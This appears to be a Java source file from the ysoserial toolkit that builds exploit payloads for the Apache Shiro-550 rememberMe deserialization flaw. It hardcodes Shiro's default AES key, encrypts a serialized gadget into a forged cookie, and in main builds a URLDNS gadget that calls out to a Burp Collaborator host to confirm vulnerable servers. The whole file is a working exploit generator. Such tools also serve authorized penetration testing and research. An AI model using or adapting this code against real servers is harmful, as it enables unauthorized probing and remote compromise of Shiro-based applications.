package ysoserial.payloads;
import org.apache.shiro.codec.Base64;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.crypto.CipherService;
import org.apache.shiro.util.ByteSource;
import ysoserial.Serializer;

public class Shiro_550 {
    public static final byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode("kPH+bIxk5D2deZiIxcaaaA==");
    public static CipherService cipherService = new AesCipherService();
    private byte[] key;
    public Shiro_550(){
        this.key = Shiro_550.DEFAULT_CIPHER_KEY_BYTES;
    }
    public static void main(String[] args) throws Exception{
        Object evil = new URLDNS().getObject("http://7iqweabe6nz9u6subovv9j87cyip6e.burpcollaborator.net");
        String payload = new Shiro_550().getPayload(evil);
        System.out.println(payload);
    }
    public byte[] encrypt(byte[] serialized) {
        ByteSource byteSource = cipherService.encrypt(serialized, this.key);
        return byteSource.getBytes();
    }
    public String getPayload(final Object evil) throws Exception{
        byte[] ser = Serializer.serialize(evil);
        byte[] cookie = encrypt(ser);
        cookie = Base64.encode(cookie);
        return new String(cookie);
    }
    public String getPayload(final Object evil,String cipherKey) throws Exception{
        this.key =  Base64.decode(cipherKey);
        byte[] ser = Serializer.serialize(evil);
        byte[] cookie = encrypt(ser);
        cookie = Base64.encode(cookie);
        return new String(cookie);
    }
}
